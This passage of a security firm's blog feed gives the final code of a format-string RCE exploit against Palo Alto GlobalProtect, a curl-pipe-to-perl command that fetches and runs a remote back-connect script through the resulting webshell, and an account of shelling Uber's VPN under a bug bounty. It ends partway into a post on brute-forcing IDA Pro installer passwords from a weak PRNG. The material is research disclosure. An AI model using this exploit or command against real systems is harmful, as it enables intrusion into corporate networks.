&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;$p&#39;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;scep-profile-name=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;appauthcookie=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;host-id=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;user-email=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;appauthcookie=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once the modification is done, the &lt;code class=&quot;highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; becomes our webshell and we can execute commands via:&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;scep-profile-name=curl orange.tw/bc.pl | perl -&#39;&lt;/span&gt; https://global-protect/sslmgr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;We have reported this bug to Palo Alto via the &lt;a href=&quot;https://securityadvisories.paloaltonetworks.com/Report&quot;&gt;report form&lt;/a&gt;. However, we got the following reply:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Hello Orange,&lt;/p&gt;

  &lt;p&gt;Thanks for the submission. Palo Alto Networks does follow coordinated vulnerability disclosure for security vulnerabilities that are reported to us by external researchers. We do not CVE items found internally and fixed. This issue was previously fixed, but if you find something in a current version, please let us know.&lt;/p&gt;

  &lt;p&gt;Kind regards&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Hmmm, so it seems this vulnerability is known for Palo Alto, but not ready for the world!&lt;/p&gt;

&lt;h2 id=&quot;the-case-study&quot;&gt;The case study&lt;/h2&gt;

&lt;p&gt;After we awared this is not a 0day, we surveyed all Palo Alto SSL VPN over the world to see if there is any large corporations using the vulnerable GlobalProtect, and Uber is one of them! From our survey, Uber owns about 22 servers running the GlobalProtect around the world, here we take &lt;code class=&quot;highlighter-rouge&quot;&gt;vpn.awscorp.uberinternal.com&lt;/code&gt; as an example!&lt;/p&gt;

&lt;p&gt;From the domain name, we guess Uber uses the BYOL from &lt;a href=&quot;https://aws.amazon.com/marketplace/pp/B00OC1T2D4?qid=1562269885823&amp;amp;sr=0-1&amp;amp;ref_=srh_res_product_title&quot;&gt;AWS Marketplace&lt;/a&gt;. From the login page, it seems Uber uses the 8.x version, and we can target the possible target version from the supported version list on the Marketplace overview page:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;8.0.3&lt;/li&gt;
  &lt;li&gt;8.0.6&lt;/li&gt;
  &lt;li&gt;8.0.8&lt;/li&gt;
  &lt;li&gt;8.0.9&lt;/li&gt;
  &lt;li&gt;8.1.0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Finally, we figured out the version, itâ€™s 8.0.6 and we got the shell back!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190717/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Uber took a very quick response and right step to fix the vulnerability and Uber gave us a detail explanation to the bounty decision:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Hey @orange â€” we wanted to provide a little more context on the decision for this bounty. During our internal investigation, we found that the Palo Alto SSL VPN is not the same as the primary VPN which is used by the majority of our employees.&lt;/p&gt;

  &lt;p&gt;Additionally, we hosted the Palo Alto SSL VPN in AWS as opposed to our core infrastructure; as such, this would not have been able to access any of our internal infrastructure or core services. For these reasons, we determined that while it was an unauthenticated RCE, the overall impact and positional advantage of this was low. Thanks again for an awesome report!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Itâ€™s a fair decision. Itâ€™s always a great time communicating with Uber and report to their &lt;a href=&quot;https://hackerone.com/uber&quot;&gt;bug bounty program&lt;/a&gt;. We donâ€™t care about the bounty that much, because we enjoy the whole research process and feeding back to the security community! Nothing can be better than this!&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/</link>
                <guid>https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study</guid>
                <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Palo Alto GlobalProtect è³‡å®‰é€šå ±</title>
                <description>&lt;h3 id=&quot;å…§å®¹&quot;&gt;å…§å®¹&lt;/h3&gt;

&lt;p&gt;åœ¨æˆ‘å€‘é€²è¡Œ&lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;ç´…éšŠæ¼”ç·´&lt;/a&gt;çš„éç¨‹ä¸­ï¼Œç™¼ç¾ç›®æ¨™ä½¿ç”¨çš„ Palo Alto GlobalProtect å­˜åœ¨ format string å¼±é»ï¼Œé€éæ­¤å¼±é»å¯æ§åˆ¶è©² SSL VPN ä¼ºæœå™¨ï¼Œä¸¦è—‰æ­¤é€²å…¥ä¼æ¥­å…§ç¶²ã€‚&lt;/p&gt;

&lt;p&gt;å›å ±åŸå» å¾Œï¼Œå¾—çŸ¥é€™æ˜¯å€‹å·²çŸ¥å¼±é»ä¸¦ä¸”å·²ç¶“ silent-fix äº†ï¼Œæ‰€ä»¥ä¸¦æœªæœ‰ CVE ç·¨è™Ÿã€‚ç¶“éæˆ‘å€‘åˆ†æï¼Œå­˜åœ¨é¢¨éšªçš„ç‰ˆæœ¬å¦‚ä¸‹ï¼Œå»ºè­°ç”¨æˆ¶å„˜é€Ÿæ›´æ–°è‡³æœ€æ–°ç‰ˆä»¥é¿å…é­å—æ”»æ“Šã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 7.1.x &amp;lt; 7.1.19&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.0.x &amp;lt; 8.0.12&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.1.x &amp;lt; 8.1.3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;9.x å’Œ 7.0.x ä¸¦æ²’æœ‰å­˜åœ¨é¢¨éšªã€‚&lt;/p&gt;

&lt;h3 id=&quot;ç´°ç¯€&quot;&gt;ç´°ç¯€&lt;/h3&gt;

&lt;p&gt;æˆ‘å€‘ä¹Ÿåˆ©ç”¨äº†é€™å€‹å¼±é»æˆåŠŸæ§åˆ¶äº† Uber çš„ VPN ä¼ºæœå™¨ï¼Œè©³ç´°çš„æŠ€è¡“ç´°ç¯€è«‹åƒé–±æˆ‘å€‘çš„ Advisoryï¼š&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;é™„è¨»&quot;&gt;é™„è¨»&lt;/h3&gt;

&lt;p&gt;é€™å°‡æœƒæ˜¯æˆ‘å€‘ SSL VPN ç ”ç©¶çš„ç³»åˆ—æ–‡ï¼Œé è¨ˆæœƒæœ‰ä¸‰ç¯‡ã€‚é€™ä¹Ÿæ˜¯æˆ‘å€‘ç ”ç©¶åœ˜éšŠä»Šå¹´åœ¨ &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; å’Œ &lt;a href=&quot;https://www.defcon.org/html/defcon-27/dc-27-speakers.html&quot;&gt;DEFCON&lt;/a&gt; çš„æ¼”è¬›ã€ &lt;strong&gt;Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs&lt;/strong&gt; ã€ä¸­çš„ä¸€å°éƒ¨åˆ†ï¼Œæ•¬è«‹æœŸå¾…ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/</link>
                <guid>https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory</guid>
                <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Operation Crack: Hacking IDA Pro Installer PRNG from an Unusual Way</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;Today, we are going to talk about the installation password of Hex-Rays IDA Pro, which is the most famous decompiler. What is installation password? Generally, customers receive a custom installer and installation password after they purchase IDA Pro. The installation password is required during installation process. However, if someday we find a leaked IDA Pro installer, is it still possible to install without an installation password? This is an interesting topic.&lt;/p&gt;

&lt;p&gt;After brainstorming with our team members, we verified the answer: Yes! With a Linux or MacOS version installer, we can easily find the password directly. With a Windows version installer, we only need 10 minutes to calculate the password. The following is the detailed process:&lt;/p&gt;

&lt;h3 id=&quot;-linux-and-macos-version&quot;&gt;* Linux and MacOS version&lt;/h3&gt;

&lt;p&gt;The first challenge is Linux and MacOS version. The installer is built with an installer creation tool called InstallBuilder. We found the plaintext installation password directly in the program memory of the running IDA Pro installer. Mission complete!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190621/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This problem is fixed after we reported through Hex-Rays. &lt;a href=&quot;https://blog.bitrock.com/2019/02/installbuilder-1920-released.html&quot;&gt;BitRock&lt;/a&gt; released InstallBuilder 19.2.0 with the protection of installation password on 2019/02/11.&lt;/p&gt;

&lt;h3 id=&quot;-windows-version&quot;&gt;* Windows version&lt;/h3&gt;

&lt;p&gt;It gets harder on Windows version because the installer is built with &lt;a href=&quot;http://www.jrsoftware.org/isinfo.php&quot;&gt;Inno Setup&lt;/a&gt;, which store its password with &lt;a href=&quot;http://www.jrsoftware.org/ishelp/index.php?topic=setup_password&quot;&gt;160-bit SHA-1 hash&lt;/a&gt;. Therefore, we cannot get the password simply with static or dynamic analyzing the installer, and brute force is apparently not an effective way. But the situation is different if we can grasp the methodology of password generation, which lets us enumerate the password more effectively!&lt;/p&gt;

&lt;p&gt;Although we have realized we need to find how Hex-Rays generate password, it is still really difficult, as we do not know what language the random number generator is implemented with. There are at least &lt;a href=&quot;https://rosettacode.org/wiki/Random_number_generator_(included)&quot;&gt;88 random number generators&lt;/a&gt; known. It is such a great variation.&lt;/p&gt;

&lt;p&gt;We first tried to find the charset used by random number generator. We collected all leaked installation passwords, such as hacking teamâ€™s password, which is leaked by WikiLeaks.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;FgVQyXZY2XFk (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62729&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;7ChFzSbF4aik (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/311769&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;ZFdLqEM2QMVe (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62956&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;6VYGSyLguBfi (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/70250&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From the collected passwords we can summarize the charset:&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The missing of &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;I&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;l&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;O&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;o&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;n&lt;/code&gt; seems to make sense because they are confusing characters.&lt;br /&gt;
Next, we guess the possible charset ordering like these:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz
ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz
23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789
ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lastly, we picked some common languagesï¼ˆc/php/python/perlï¼‰to implement a random number generator and enumerate all the combinations. Then we examined whether the collected passwords appears in the combinations. For example, here is a generator written in C language:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
